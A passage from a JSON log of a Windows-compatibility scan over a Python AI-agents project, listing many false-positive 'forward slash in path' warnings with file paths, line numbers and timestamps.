        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 262: Forward slash in path - ']:,} / {budget['",
        "timestamp": "2025-09-05T17:30:42.238765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\demos\\phase2_demo.py",
        "warning": "Line 264: Forward slash in path - ']} / {budget['",
        "timestamp": "2025-09-05T17:30:42.238777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\secure_deployment.py",
        "warning": "Failed to analyze: 'utf-8' codec can't decode byte 0xca in position 8436: invalid continuation byte",
        "timestamp": "2025-09-05T17:30:42.239089"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 87: Forward slash in path - 'open\\s*\\([^)]*\\.\\.\\/'",
        "timestamp": "2025-09-05T17:30:42.239410"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 88: Forward slash in path - 'file\\s*\\([^)]*\\.\\.\\/'",
        "timestamp": "2025-09-05T17:30:42.239419"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 89: Forward slash in path - 'os\\.path\\.join\\s*\\([^)]*\\.\\.\\/'",
        "timestamp": "2025-09-05T17:30:42.239425"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 181: Forward slash in path - \"Security Score: {result.security_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.239492"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 514: Forward slash in path - \"Add automated security testing to CI/CD\"",
        "timestamp": "2025-09-05T17:30:42.239711"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\deployment\\security_audit_comprehensive.py",
        "warning": "Line 613: Forward slash in path - \"Security Score: {result.security_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.239777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 31: Forward slash in path - \"test/task#001\"",
        "timestamp": "2025-09-05T17:30:42.240088"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 138: Forward slash in path - \"core/shared/interfaces.py\"",
        "timestamp": "2025-09-05T17:30:42.240143"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 139: Forward slash in path - \"core/shared/events.py\"",
        "timestamp": "2025-09-05T17:30:42.240151"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 140: Forward slash in path - \"core/shared/services.py\"",
        "timestamp": "2025-09-05T17:30:42.240159"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 141: Forward slash in path - \"core/autonomous/services/autonomous_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240168"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 142: Forward slash in path - \"core/reasoning/services/reasoning_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240176"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 143: Forward slash in path - \"core/security/services/security_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240185"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 144: Forward slash in path - \"core/integration/orchestration/orchestration_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240195"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 145: Forward slash in path - \"core/integration/deployment/deployment_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240203"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 193: Forward slash in path - \")\n    \n    # Calculate score\n    score = (passed / total) * 100\n    \n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.240233"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_architecture_core.py",
        "warning": "Line 201: Forward slash in path - \"Tests Passed: {passed}/{total}\"",
        "timestamp": "2025-09-05T17:30:42.240244"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 84: Forward slash in path - \"core/shared/interfaces.py\"",
        "timestamp": "2025-09-05T17:30:42.240574"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 85: Forward slash in path - \"core/shared/events.py\"",
        "timestamp": "2025-09-05T17:30:42.240584"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 86: Forward slash in path - \"core/shared/services.py\"",
        "timestamp": "2025-09-05T17:30:42.240590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 87: Forward slash in path - \"core/autonomous/services/autonomous_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240597"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 88: Forward slash in path - \"core/reasoning/services/reasoning_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240604"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 89: Forward slash in path - \"core/security/services/security_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240610"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 90: Forward slash in path - \"core/integration/orchestration/orchestration_service.py\"",
        "timestamp": "2025-09-05T17:30:42.240617"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_core_imports.py",
        "warning": "Line 130: Forward slash in path - \"Tests Passed: {passed}/{len(tests)}\"",
        "timestamp": "2025-09-05T17:30:42.240637"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\testing\\test_new_architecture.py",
        "warning": "Line 155: Forward slash in path - \"Tests Passed: {tests_passed}/{total_tests}\"",
        "timestamp": "2025-09-05T17:30:42.241163"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 32: Forward slash in path - \"{base_url}/health\"",
        "timestamp": "2025-09-05T17:30:42.241434"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 41: Forward slash in path - \"{base_url}/docs\"",
        "timestamp": "2025-09-05T17:30:42.241446"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 46: Forward slash in path - \"   Documentation available at: {base_url}/docs\"",
        "timestamp": "2025-09-05T17:30:42.241453"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 53: Forward slash in path - \"{base_url}/openapi.json\"",
        "timestamp": "2025-09-05T17:30:42.241460"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 73: Forward slash in path - \"{base_url}/\"",
        "timestamp": "2025-09-05T17:30:42.241478"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 92: Forward slash in path - \"\\n[SUMMARY] {passed}/{total} tests passed ({passed/total*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.241493"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_api_simple.py",
        "warning": "Line 95: Forward slash in path - \"\\n[SUCCESS] API documentation is accessible at {base_url}/docs\"",
        "timestamp": "2025-09-05T17:30:42.241499"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 91: Forward slash in path - \"\n            ACME CORPORATION\n            123 Business Street\n            New York, NY 10001\n            \n            INVOICE\n            \n            Invoice Number: INV-2024-001\n            Invoice Date: 01/15/2024\n            \n            Bill To:\n            XYZ Company\n            456 Client Avenue\n            \n            Description                 Total\n            Professional Services     $1,500.00\n            Consulting Hours          $1,000.00\n            \n            Total Amount:             $2,500.00\n            \"",
        "timestamp": "2025-09-05T17:30:42.241830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 176: Forward slash in path - \"PASS: {successful_tasks}/{len(tasks)} parallel tasks completed\"",
        "timestamp": "2025-09-05T17:30:42.241877"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 201: Forward slash in path - 'agents/accountancy/invoice_processor.py'",
        "timestamp": "2025-09-05T17:30:42.241896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 202: Forward slash in path - 'templates/base_agent.py'",
        "timestamp": "2025-09-05T17:30:42.241904"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 203: Forward slash in path - 'utils/observability/logging.py'",
        "timestamp": "2025-09-05T17:30:42.241911"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 222: Forward slash in path - '}: {dir_path}/ directory\"",
        "timestamp": "2025-09-05T17:30:42.241926"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 226: Forward slash in path - 'api/main.py'",
        "timestamp": "2025-09-05T17:30:42.241933"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 227: Forward slash in path - 'dashboard/main_dashboard.py'",
        "timestamp": "2025-09-05T17:30:42.241941"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 228: Forward slash in path - 'demo/ultimate_demo.py'",
        "timestamp": "2025-09-05T17:30:42.241949"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 254: Forward slash in path - \"Invoice INV-001 Date: 01/01/2024 Total: $100.00 Vendor: Test Co\"",
        "timestamp": "2025-09-05T17:30:42.241968"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 255: Forward slash in path - \"Invoice INV-002 Date: 01/02/2024 Total: $200.00 Vendor: Demo Corp\"",
        "timestamp": "2025-09-05T17:30:42.241978"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 256: Forward slash in path - \"Invoice INV-003 Date: 01/03/2024 Total: $300.00 Vendor: Sample LLC\"",
        "timestamp": "2025-09-05T17:30:42.241986"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 272: Forward slash in path - ', 0) for r in results)\n            avg_accuracy = accuracy_sum / len(results) if results else 0\n            \n            docs_per_second = len(test_documents) / total_time\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.242000"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 278: Forward slash in path - \"PASS: Throughput: {docs_per_second:.1f} documents/second\"",
        "timestamp": "2025-09-05T17:30:42.242010"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 279: Forward slash in path - \"PASS: Success rate: {successful}/{len(test_documents)} ({successful/len(test_documents)*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.242019"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 280: Forward slash in path - \")\n            \n            # Performance targets\n            speed_target = docs_per_second > 0.5  # At least 0.5 docs/second\n            success_target = successful >= 2  # At least 2/3 successful\n            accuracy_target = avg_accuracy > 0.5  # At least 50% average accuracy\n            \n            success = speed_target and success_target and accuracy_target\n            self.test_results['",
        "timestamp": "2025-09-05T17:30:42.242034"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 325: Forward slash in path - \"Time Savings: {total_time_savings/60:.1f} minutes ({time_savings_per_doc/60:.1f} per document)\"",
        "timestamp": "2025-09-05T17:30:42.242061"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 326: Forward slash in path - \")\n        \n        # Projected annual impact (based on 10,000 documents/year)\n        annual_docs = 10000\n        annual_cost_savings = annual_docs * cost_savings_per_doc\n        annual_time_savings_hours = (annual_docs * time_savings_per_doc) / 3600\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.242074"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 336: Forward slash in path - \"ROI: {(annual_cost_savings / 50000) * 100:.0f}% (assuming $50K implementation cost)\"",
        "timestamp": "2025-09-05T17:30:42.242087"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_master_platform.py",
        "warning": "Line 345: Forward slash in path - \"*60)\n        \n        # Test results summary\n        total_tests = len(self.test_results)\n        passed_tests = sum(self.test_results.values())\n        pass_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.242103"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\tests\\test_phase2.py",
        "warning": "Line 30: Forward slash in path - \"\nACME CORPORATION\n123 Business Street\nNew York, NY 10001\n\nINVOICE\n\nInvoice Number: INV-2024-001\nInvoice Date: 01/15/2024\n\nBill To:\nXYZ Company\n456 Client Avenue\n\nDescription                 Total\nProfessional Services     $1,500.00\nConsulting Hours          $1,000.00\n\nTotal Amount:             $2,500.00\n    \"",
        "timestamp": "2025-09-05T17:30:42.242386"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 99: Forward slash in path - \"Architecture validation complete. Score: {score.total_score:.1f}/100 ({score.grade})\"",
        "timestamp": "2025-09-05T17:30:42.242844"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 107: Forward slash in path - \"**/*.py\"",
        "timestamp": "2025-09-05T17:30:42.242857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 122: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.242874"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 228: Forward slash in path - \")\n        \n        for component_name, metrics in self.components.items():\n            # Check lines of code\n            if metrics.lines_of_code > 500:\n                severity = min(10, int(metrics.lines_of_code / 100))\n                \n                self.violations.append(ArchitectureViolation(\n                    violation_type=ArchitectureViolationType.GOD_COMPONENT,\n                    component=component_name,\n                    severity=severity,\n                    description=f\"",
        "timestamp": "2025-09-05T17:30:42.242950"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 240: Forward slash in path - \"\n                ))\n            \n            # Check number of responsibilities\n            if metrics.responsibilities > 10:\n                severity = min(10, int(metrics.responsibilities / 2))\n                \n                self.violations.append(ArchitectureViolation(\n                    violation_type=ArchitectureViolationType.GOD_COMPONENT,\n                    component=component_name,\n                    severity=severity,\n                    description=f\"",
        "timestamp": "2025-09-05T17:30:42.242971"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 252: Forward slash in path - \"\n                ))\n            \n            # Check number of dependencies\n            if len(metrics.dependencies) > 15:\n                severity = min(10, int(len(metrics.dependencies) / 3))\n                \n                self.violations.append(ArchitectureViolation(\n                    violation_type=ArchitectureViolationType.TIGHT_COUPLING,\n                    component=component_name,\n                    severity=severity,\n                    description=f\"",
        "timestamp": "2025-09-05T17:30:42.242991"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 269: Forward slash in path - \")\n        \n        for component_name, metrics in self.components.items():\n            # Calculate coupling metrics\n            afferent_coupling = len(metrics.dependents)  # Incoming dependencies\n            efferent_coupling = len(metrics.dependencies)  # Outgoing dependencies\n            \n            # Instability metric (Ce / (Ca + Ce))\n            if afferent_coupling + efferent_coupling > 0:\n                instability = efferent_coupling / (afferent_coupling + efferent_coupling)\n                \n                # High instability for stable components is bad\n                if afferent_coupling > 5 and instability > 0.7:\n                    self.violations.append(ArchitectureViolation(\n                        violation_type=ArchitectureViolationType.TIGHT_COUPLING,\n                        component=component_name,\n                        severity=6,\n                        description=f\"",
        "timestamp": "2025-09-05T17:30:42.243022"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 356: Forward slash in path - \"High dependency on concrete implementations ({concrete_dependencies}/{len(metrics.dependencies)})\"",
        "timestamp": "2025-09-05T17:30:42.243091"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 357: Forward slash in path - \"Depend on abstractions/interfaces rather than concrete implementations\"",
        "timestamp": "2025-09-05T17:30:42.243111"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 416: Forward slash in path - \"\n🏗️  ARCHITECTURE QUALITY REPORT\n=====================================\n\nOVERALL SCORE: {score.total_score:.1f}/100 (Grade: {score.grade})\n\nDETAILED SCORES:\n• Dependency Management: {score.dependency_score:.1f}/100\n• Cohesion & Separation: {score.cohesion_score:.1f}/100  \n• Coupling Control: {score.coupling_score:.1f}/100\n• Abstraction Layers: {score.abstraction_score:.1f}/100\n\nVIOLATIONS FOUND: {len(score.violations)}\n\"",
        "timestamp": "2025-09-05T17:30:42.243173"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\architecture_validation.py",
        "warning": "Line 449: Forward slash in path - \"     Severity: {violation.severity}/10\"",
        "timestamp": "2025-09-05T17:30:42.243204"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 95: Forward slash in path - \"Analysis Complete: {total_files_analyzed}/{len(python_files)} files\"",
        "timestamp": "2025-09-05T17:30:42.243572"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 128: Forward slash in path - ')])\n            docstring_lines = self._count_docstring_lines(tree)\n            total_doc_lines = comment_lines + docstring_lines\n            metrics.documentation_ratio = total_doc_lines / max(len(lines), 1)\n            \n            # Complexity analysis\n            metrics.complexity_score = self._calculate_complexity(tree)\n            \n            # Security analysis\n            metrics.security_score = self._analyze_security(content)\n            \n            # Performance analysis\n            metrics.performance_score = self._analyze_performance(content, tree)\n            \n            # Maintainability analysis\n            metrics.maintainability_score = self._analyze_maintainability(content, tree)\n            \n            # Generate issues and recommendations\n            self._generate_issues_and_recommendations(metrics, content, tree)\n            \n        except Exception as e:\n            metrics.issues.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.243628"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 193: Forward slash in path - ')) * 0.01  # 1% threshold\n        security_score = max(0.0, 1.0 - (security_issues / max(max_expected_issues, 1)))\n        \n        return security_score\n    \n    def _analyze_performance(self, content: str, tree: ast.AST) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.243679"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 199: Forward slash in path - \"\n        performance_issues = 0\n        \n        # Check for anti-patterns\n        for pattern in self.performance_antipatterns:\n            matches = re.findall(pattern, content, re.IGNORECASE)\n            performance_issues += len(matches)\n        \n        # Check for async/await usage (good for performance)\n        async_functions = len([node for node in ast.walk(tree) \n                             if isinstance(node, ast.AsyncFunctionDef)])\n        total_functions = len([node for node in ast.walk(tree) \n                             if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))])\n        \n        async_ratio = async_functions / max(total_functions, 1)\n        \n        # Calculate performance score\n        base_score = max(0.0, 1.0 - (performance_issues * 0.1))\n        async_bonus = min(0.2, async_ratio * 0.5)  # Bonus for async usage\n        \n        return min(1.0, base_score + async_bonus)\n    \n    def _analyze_maintainability(self, content: str, tree: ast.AST) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.243704"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 249: Forward slash in path - ')):\n                                imports_at_top = False\n                                break\n        \n        # Calculate maintainability score\n        base_score = 1.0\n        \n        # Penalties\n        if long_functions > 0:\n            base_score -= long_functions * 0.1\n        \n        if not imports_at_top:\n            base_score -= 0.1\n        \n        # Class vs function ratio (good OOP design)\n        classes = len([node for node in ast.walk(tree) if isinstance(node, ast.ClassDef)])\n        functions = len([node for node in ast.walk(tree) if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))])\n        \n        if functions > 0:\n            class_ratio = classes / functions\n            if class_ratio > 0.1:  # Good OOP structure\n                base_score += 0.1\n        \n        return max(0.0, min(1.0, base_score))\n    \n    def _generate_issues_and_recommendations(self, metrics: CodeMetrics, content: str, tree: ast.AST):\n        \"",
        "timestamp": "2025-09-05T17:30:42.243754"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 331: Forward slash in path - \"\n        total_files = len(self.metrics)\n        total_lines = sum(m.lines_of_code for m in self.metrics.values())\n        \n        # Calculate aggregate scores\n        avg_complexity = sum(m.complexity_score for m in self.metrics.values()) / max(total_files, 1)\n        avg_documentation = sum(m.documentation_ratio for m in self.metrics.values()) / max(total_files, 1)\n        avg_security = sum(m.security_score for m in self.metrics.values()) / max(total_files, 1)\n        avg_performance = sum(m.performance_score for m in self.metrics.values()) / max(total_files, 1)\n        avg_maintainability = sum(m.maintainability_score for m in self.metrics.values()) / max(total_files, 1)\n        \n        # Overall quality score (weighted average)\n        overall_quality = (\n            avg_security * 0.25 +\n            avg_performance * 0.20 +\n            avg_maintainability * 0.20 +\n            (1.0 - avg_complexity/20.0) * 0.20 +  # Complexity penalty\n            avg_documentation * 0.15\n        )\n        \n        # Collect all issues by severity\n        issues_by_severity = defaultdict(int)\n        all_issues = []\n        all_recommendations = set()\n        \n        for metrics in self.metrics.values():\n            for issue in metrics.issues:\n                issues_by_severity[issue['",
        "timestamp": "2025-09-05T17:30:42.243844"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 431: Forward slash in path - \"\n        rankings = []\n        \n        for path, metrics in self.metrics.items():\n            # Calculate file quality score\n            file_score = (\n                metrics.security_score * 0.25 +\n                metrics.performance_score * 0.20 +\n                metrics.maintainability_score * 0.20 +\n                (1.0 - metrics.complexity_score/20.0) * 0.20 +\n                metrics.documentation_ratio * 0.15\n            )\n            \n            rankings.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.243931"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\code_quality_analysis.py",
        "warning": "Line 486: Forward slash in path - \"Set up automated code quality checks in CI/CD\"",
        "timestamp": "2025-09-05T17:30:42.243977"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 342: Forward slash in path - \"Advanced async/await pattern implementation\"",
        "timestamp": "2025-09-05T17:30:42.244719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
        "warning": "Line 350: Forward slash in path - \"CI/CD pipeline enhancement\"",
        "timestamp": "2025-09-05T17:30:42.244755"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\validation\\phase7_final_validation_report.py",
